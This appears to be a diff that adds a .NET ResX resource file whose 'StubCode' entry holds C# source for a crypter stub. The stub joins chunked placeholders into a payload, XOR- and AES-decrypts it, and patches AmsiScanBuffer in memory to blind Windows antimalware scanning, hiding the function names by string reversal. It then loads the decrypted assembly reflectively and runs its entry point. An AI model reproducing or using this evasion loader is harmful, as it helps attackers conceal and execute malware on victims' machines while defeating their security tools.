@@ -1,0 +1,358 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<root>
+  <!-- 
+    Microsoft ResX Schema 
+    
+    Version 2.0
+    
+    The primary goals of this format is to allow a simple XML format 
+    that is mostly human readable. The generation and parsing of the 
+    various data types are done through the TypeConverter classes 
+    associated with the data types.
+    
+    Example:
+    
+    ... ado.net/XML headers & schema ...
+    <resheader name="resmimetype">text/microsoft-resx</resheader>
+    <resheader name="version">2.0</resheader>
+    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
+    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
+    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
+    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
+    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
+        <value>[base64 mime encoded serialized .NET Framework object]</value>
+    </data>
+    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
+        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
+        <comment>This is a comment</comment>
+    </data>
+                
+    There are any number of "resheader" rows that contain simple 
+    name/value pairs.
+    
+    Each data row contains a name, and value. The row also contains a 
+    type or mimetype. Type corresponds to a .NET class that support 
+    text/value conversion through the TypeConverter architecture. 
+    Classes that don't support this are serialized and stored with the 
+    mimetype set.
+    
+    The mimetype is used for serialized objects, and tells the 
+    ResXResourceReader how to depersist the object. This is currently not 
+    extensible. For a given mimetype the value must be set accordingly:
+    
+    Note - application/x-microsoft.net.object.binary.base64 is the format 
+    that the ResXResourceWriter will generate, however the reader can 
+    read any of the formats listed below.
+    
+    mimetype: application/x-microsoft.net.object.binary.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
+            : and then encoded with base64 encoding.
+    
+    mimetype: application/x-microsoft.net.object.soap.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
+            : and then encoded with base64 encoding.
+
+    mimetype: application/x-microsoft.net.object.bytearray.base64
+    value   : The object must be serialized into a byte array 
+            : using a System.ComponentModel.TypeConverter
+            : and then encoded with base64 encoding.
+    -->
+  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
+    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
+    <xsd:element name="root" msdata:IsDataSet="true">
+      <xsd:complexType>
+        <xsd:choice maxOccurs="unbounded">
+          <xsd:element name="metadata">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" />
+              </xsd:sequence>
+              <xsd:attribute name="name" use="required" type="xsd:string" />
+              <xsd:attribute name="type" type="xsd:string" />
+              <xsd:attribute name="mimetype" type="xsd:string" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="assembly">
+            <xsd:complexType>
+              <xsd:attribute name="alias" type="xsd:string" />
+              <xsd:attribute name="name" type="xsd:string" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="data">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
+              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
+              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="resheader">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" />
+            </xsd:complexType>
+          </xsd:element>
+        </xsd:choice>
+      </xsd:complexType>
+    </xsd:element>
+  </xsd:schema>
+  <resheader name="resmimetype">
+    <value>text/microsoft-resx</value>
+  </resheader>
+  <resheader name="version">
+    <value>2.0</value>
+  </resheader>
+  <resheader name="reader">
+    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <resheader name="writer">
+    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <data name="StubCode" xml:space="preserve">
+    <value>
+using System;
+using System.Windows.Forms;
+using System.Security.Cryptography;
+using System.IO;
+using System.Reflection;
+using System.Collections.Generic;
+using System.Runtime.InteropServices;
+
+namespace stub
+{
+    static class Program
+    {
+        private const string key = "%KEY%";
+        private const string IV = "%IV%";
+        private const string xorKey = "%XORKEY%";
+        private const string GENERIC_ERROR = "Generic error while starting the application.";
+
+        private static readonly string[] payloadChunks = new string[]
+        {
+%CHUNKS%
+        };
+
+        private static Dictionary&lt;string, byte[]&gt; dependencies = new Dictionary&lt;string, byte[]&gt;();
+
+        private static void Log(string msg)
+        {
+            try
+            {
+                File.AppendAllText(Path.Combine(Path.GetTempPath(), "ncstub.log"), DateTime.Now.ToString("HH:mm:ss.fff") + " " + msg + Environment.NewLine);
+            }
+            catch
+            {
+            }
+        }
+
+        private static string GetPayload()
+        {
+            int total = 0;
+            for (int i = 0; i &lt; payloadChunks.Length; i++)
+            {
+                total += payloadChunks[i].Length;
+            }
+            char[] buf = new char[total];
+            int pos = 0;
+            for (int i = 0; i &lt; payloadChunks.Length; i++)
+            {
+                payloadChunks[i].CopyTo(0, buf, pos, payloadChunks[i].Length);
+                pos += payloadChunks[i].Length;
+            }
+            return new string(buf);
+        }
+
+        private static byte[] Xor(byte[] data, byte[] xkey)
+        {
+            for (int i = 0; i &lt; data.Length; i++)
+            {
+                data[i] = (byte)(data[i] ^ xkey[i % xkey.Length]);
+            }
+            return data;
+        }
+
+        private static Assembly ResolveAssembly(object sender, ResolveEventArgs args)
+        {
+            string simpleName = new AssemblyName(args.Name).Name;
+            byte[] data;
+            if (dependencies.TryGetValue(simpleName, out data))
+            {
+                Log("resolve ok: " + simpleName);
+                return Assembly.Load(data);
+            }
+            Log("resolve miss: " + simpleName);
+            return null;
+        }
+
+        private static string DecodeName(char[] reversed)
+        {
+            Array.Reverse(reversed);
+            return new string(reversed);
+        }
+
+        private static void PatchAmsi()
+        {
+            try
+            {
+                IntPtr amsi = LoadLibrary(DecodeName(new char[] { 'l', 'l', 'd', '.', 'i', 's', 'm', 'a' }));
+                if (amsi == IntPtr.Zero)
+                {
+                    return;
+                }
+                IntPtr addr = GetProcAddress(amsi, DecodeName(new char[] { 'r', 'e', 'f', 'f', 'u', 'B', 'n', 'a', 'c', 'S', 'i', 's', 'm', 'A' }));
+                if (addr == IntPtr.Zero)
+                {
+                    return;
+                }
+                // mov eax, 0x80070057 (E_INVALIDARG); ret
+                byte[] patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+                uint oldProtect;
+                if (!VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect))
+                {
+                    return;
+                }
+                Marshal.Copy(patch, 0, addr, patch.Length);
+                VirtualProtect(addr, (UIntPtr)patch.Length, oldProtect, out oldProtect);
+            }
+            catch
+            {
+            }
+        }
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
+        private static extern IntPtr LoadLibrary(string lpFileName);
+
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+
+        [DllImport("kernel32.dll")]
+        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        [STAThread]
+        static void Main()
+        {
+            try
+            {
+                AppDomain.CurrentDomain.UnhandledException += delegate(object sender, UnhandledExceptionEventArgs e)
+                {
+                    Log("UNHANDLED: " + (e.ExceptionObject == null ? "null" : e.ExceptionObject.ToString()));
+                };
+
+                byte[] app = Convert.FromBase64String(GetPayload());
+                app = Xor(app, Convert.FromBase64String(xorKey));
+                Log("payload decoded, cipher len=" + app.Length);
+
+                byte[] decrypted;
+                RijndaelManaged rijndael = new RijndaelManaged();
+                rijndael.KeySize = 256;
+                rijndael.Key = Convert.FromBase64String(key);
+                rijndael.IV = Convert.FromBase64String(IV);
+                rijndael.Padding = PaddingMode.ISO10126;
+                using (MemoryStream memoryStream = new MemoryStream())
+                {
+                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndael.CreateDecryptor(), CryptoStreamMode.Write))
+                    {
+                        cryptoStream.Write(app, 0, app.Length);
+                        cryptoStream.FlushFinalBlock();
+                    }
+                    decrypted = memoryStream.ToArray();
+                }
+                Log("decrypt ok, len=" + decrypted.Length);
+
+                // ---- parse payload container ----
+                byte[] mainData;
+                using (MemoryStream container = new MemoryStream(decrypted))
+                using (BinaryReader reader = new BinaryReader(container))
+                {
+                    try
+                    {
+                        int magic = reader.ReadInt32();
+                        if (magic != 0x4E435434)
+                        {
+                            throw new Exception("Invalid container magic (0x" + magic.ToString("X8") + "). Packer/stub mismatch or payload corrupted.");
+                        }
+                        int declaredSize = reader.ReadInt32();
+                        if (container.Length - 8 != declaredSize)
+                        {
+                            throw new Exception("Container size mismatch at header (declared=" + declaredSize + ", actual=" + (container.Length - 8) + "). Payload truncated or chunks corrupted.");
+                        }
+                        int count = reader.ReadInt32();
+                        if (count &lt; 0 || count &gt; 64)
+                        {
+                            throw new Exception("Unexpected container header (count=" + count + "). Packer and stub versions may not match.");
+                        }
+                        for (int i = 0; i &lt; count; i++)
+                        {
+                            string depName = reader.ReadString();
+                            if (depName.Length == 0 || depName.Length &gt; 512)
+                            {
+                                throw new Exception("Invalid dependency name at index " + i + " (len=" + depName.Length + ", position=" + container.Position + ").");
+                            }
+                            int dataLength = reader.ReadInt32();
+                            if (dataLength &lt;= 0 || dataLength &gt; container.Length - container.Position)
+                            {
+                                throw new Exception("Invalid dependency data length at index " + i + " (len=" + dataLength + ", position=" + container.Position + ", remaining=" + (container.Length - container.Position) + ").");
+                            }
+                            dependencies[depName] = reader.ReadBytes(dataLength);
+                        }
+                        int mainLength = reader.ReadInt32();
+                        if (mainLength &lt;= 0 || container.Position + mainLength &gt; container.Length)
+                        {
+                            throw new Exception("Payload container is invalid or truncated (mainLength=" + mainLength + ", remaining=" + (container.Length - container.Position) + ", container=" + container.Length + ")");
+                        }
+                    mainData = reader.ReadBytes(mainLength);
+                        if (container.Position != container.Length)
+                        {
+                            throw new Exception("Trailing bytes after main assembly (position=" + container.Position + ", length=" + container.Length + ").");
+                        }
+                    }
+                    catch (EndOfStreamException)
+                    {
+                        throw new Exception("Payload container truncated while parsing (position=" + container.Position + ", length=" + container.Length + "). Payload likely truncated or packer/stub mismatch.");
+                    }
+                }
+                Log("container ok, deps=" + dependencies.Count + ", main=" + mainData.Length);
+
+                PatchAmsi();
+                Log("amsi patched");
+
+                AppDomain.CurrentDomain.AssemblyResolve += ResolveAssembly;
+
+                Assembly newAssembly = Assembly.Load(mainData);
+                Log("assembly loaded: " + newAssembly.FullName);
+
+                MethodInfo entryPoint = newAssembly.EntryPoint;
+                ParameterInfo[] parameters = entryPoint.GetParameters();
+                Log("entry point: " + entryPoint.Name + ", params=" + parameters.Length);
+                Log("invoking entry...");
+                if (parameters.Length == 0)
+                {
+                    entryPoint.Invoke(null, null);
+                }
+                else
+                {
+                    entryPoint.Invoke(null, new object[] { new string[0] });
+                }
+                Log("entry returned");
+            }
+            catch (Exception exz)
+            {
+                Log("ERROR: " + exz.ToString());
+                MessageBox.Show(GENERIC_ERROR + "\n\n" + exz.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+
+        }
+    }
+}
+    </value>
+  </data>
+</root>
